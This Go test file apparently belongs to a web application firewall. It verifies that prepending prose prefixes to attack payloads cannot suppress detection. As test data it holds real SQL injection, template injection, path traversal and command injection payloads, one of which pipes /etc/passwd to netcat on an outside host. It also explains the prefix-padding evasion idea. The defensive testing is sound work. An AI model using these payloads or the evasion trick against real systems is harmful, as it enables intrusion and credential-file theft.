package semantic

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

// documentGuardPrefixes each satisfy one sub-guard of securityDocumentContext
// while carrying no attack semantics of their own. The padding is the only price
// an attacker pays, because those sub-guards key on prose marker presence plus a
// length floor.
var documentGuardPrefixes = []struct {
	name   string
	prefix string
}{
	{"structured poc template", "【漏洞类型】x\n【POC利用方法】\n" + strings.Repeat("a", 160)},
	{"ctf challenge writeup", "## Description\n" + strings.Repeat("c", 210)},
	{"python import stack", "import os\nimport sys\nimport re\nimport json\n" + strings.Repeat("z", 110)},
}

// guardedCategoryPayloads are real attack bodies taken from the curated corpus
// (curated_external_shapes.jsonl), one per category that routes through
// securityDocumentContext in analyzer.go.
//
// NoSQL is intentionally excluded. analyzeNoSQL operates on individual structured
// field values extracted from JSON or form bodies after request parsing. An attacker
// cannot prepend arbitrary prose to a NoSQL payload without breaking JSON syntax and
// thus preventing field extraction in the first place. The prose-prefix oracle model
// assumes attacker control over the full candidate text, which does not hold for the
// nosqli path — making the oracle test moot for that category by design.
var guardedCategoryPayloads = []struct {
	category string
	analyze  func(semanticCandidate) (Hit, bool)
	payload  string
}{
	{"sqli", analyzeSQL, "id=1;exec master..xp_cmdshell 'whoami'--"},
	{"ssti", analyzeSSTI, "{{''.__class__.__mro__[1].__subclasses__()}}"},
	{"rce", analyzeRCE, ";cat /etc/passwd|nc 10.0.0.1 4444"},
	{"lfi", analyzeLFI, "/download?file=....//....//etc/passwd"},
}

// TestDocumentGuardIsNotAnEvasionOracleAcrossCategories generalises the webshell
// finding. securityDocumentContext is shared by analyzeSQL, analyzeNoSQL,
// analyzeSSTI, analyzeRCE and analyzeLFI, and on every one of those paths the
// text it inspects is supplied by the attacker in full. Each call site applies
// confidence *= 0.4 followed by a < 0.7 cutoff, and since every base confidence
// there is below 1.75 the multiplier is a total suppression.
//
// If prepending prose to a real payload suppresses the category, the guard is an
// attacker-controllable oracle in that category exactly as it was in webshell.
func TestDocumentGuardIsNotAnEvasionOracleAcrossCategories(t *testing.T) {
	for _, tc := range guardedCategoryPayloads {
		t.Run(tc.category, func(t *testing.T) {
			// Precondition: the bare payload must fire, or the case proves nothing.
			if _, ok := tc.analyze(semanticCandidate{text: tc.payload}); !ok {
				t.Fatalf("precondition failed: bare %s payload does not fire: %q", tc.category, tc.payload)
			}

			for _, p := range documentGuardPrefixes {
				t.Run(p.name, func(t *testing.T) {
					doc := p.prefix + "\n" + tc.payload
					if !securityDocumentContext(doc) {
						t.Skipf("prefix no longer satisfies securityDocumentContext; case is moot")
					}
					if _, ok := tc.analyze(semanticCandidate{text: doc}); !ok {
						t.Errorf("%s suppressed by a %s prefix: the shared document guard is an attacker-controllable oracle on this path", tc.category, p.name)
					}
				})
			}
		})
	}
}

// TestDocumentGuardOracleEndToEnd is the part that decides severity. Even if a
// category is suppressed, the request must not sail through the mounted analyzer
// undetected.
func TestDocumentGuardOracleEndToEnd(t *testing.T) {
	detects := func(t *testing.T, body string) bool {
		t.Helper()
		req := httptest.NewRequest(http.MethodPost, "http://x/api/items", nil)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		reqCtx := &engine.RequestContext{
			Request:     req,
			DecodedBody: []byte(body),
			Metadata:    map[string]any{},
		}
		got, err := NewAnalyzer("block", 2).Detect(context.Background(), reqCtx)
		if err != nil {
			t.Fatal(err)
		}
		return got != nil && got.Detected
	}

	for _, tc := range guardedCategoryPayloads {
		// Control: without the prefix the analyzer must detect this payload.
		// Without this the suppression results below would prove nothing.
		t.Run(tc.category+"/control-bare-payload", func(t *testing.T) {
			if !detects(t, tc.payload) {
				t.Fatalf("control failed: analyzer does not detect the bare %s payload, so suppression cannot be attributed", tc.category)
			}
		})

		for _, p := range documentGuardPrefixes {
			t.Run(tc.category+"/"+p.name, func(t *testing.T) {
				doc := p.prefix + "\n" + tc.payload

				if !detects(t, doc) {
					t.Errorf("analyzer returned no detection at all for a real %s payload behind a %s prefix", tc.category, p.name)
				}
			})
		}
	}
}
